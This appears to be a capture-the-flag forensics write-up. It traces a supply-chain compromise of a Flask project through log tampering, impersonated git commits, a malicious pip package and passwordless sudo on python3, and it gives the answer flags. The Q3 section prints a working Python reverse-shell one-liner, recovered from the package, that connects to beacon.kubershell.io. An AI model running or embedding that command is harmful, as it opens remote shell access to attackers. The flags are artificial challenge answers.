
# Q1 – SSH Root Access & Log Tampering

Upon inspecting the authentication logs, we notice the following:

- A direct root connection was closed.
- An SSH session was subsequently closed.
- The logs indicate **tampering**, suggesting malicious activity.

From this, we obtain the first flag:

```
nexus{192.168.100.13_ssh}
```

---

# Q2 – Suspicious Git Activity in `flask-app`

While exploring the home directory, we find a folder named `test-projects`, which contains several repositories.

- In the `flask-app` repo, we discover suspicious merge activity.
- The suspicious commits and pull requests that are merged  originate from a user named **CyberBug77**.
- The first commit's metadata reveals the author email and username:
  - **Email**: `kamoudz34@gmail.com`
  - **Username**: `achrafness`
- Searching GitHub, we identify that **achrafness** is a real developer and a member of the dev team, indicating impersonation.

From this information, we get the flag:

```
nexus{a30b48a12aedf79decc3809b3d77dc2e3466816e_kamoudz34@gmail.com_achrafness}
```

---

# Q3 – Malicious Python Package

While investigating the attack further:

- We find a package named **`flask_auth_sys`** added as a dependency but **never used** in the code.
- The package was removed from public registries but still exists locally on the system at:

  ```
  /flask-app/penv/lib/python3.12/site-packages/flask_auth_sys/
  ```

- In `main.py`, we discover an encrypted payload using Fernet decryption. Once decrypted, we get a reverse shell command:

  ```python
  python3 -c "import socket,os,pty,subprocess; s=socket.socket(); s.connect(('beacon.kubershell.io',9001)); [os.dup2(s.fileno(),i) for i in (0,1,2)]; subprocess.Popen(['/bin/bash'], preexec_fn=os.setsid)"
  ```

- This confirms a reverse shell to `kubershell.io`.

The constructed flag is:

```
nexus{flask_auth_system_0.0.2_kubershell.io}
```

---

# Q4 – Privilege Escalation & Sudo Misconfiguration

Given that the attacker was able to delete logs, it's clear they achieved **admin access**.


- Checking `/etc/sudoers`, we find that the user **`dev-team`** can execute three binaries using `sudo` **without a password**.
- One of them is:

  ```
  /usr/bin/python3
  ```

- This corresponds to a known MITRE technique:

  - **T1548.003** – *Abuse Elevation Control Mechanism: sudo privilge with no password required like apt, pyrhon3..*

The final flag is:

```
nexus{T1548.003_/usr/bin/python3}
```

---


after answering all challenges you get the flag :nexus{op3r4tion_3nd1aness_initialized_through_5upply_chain!!}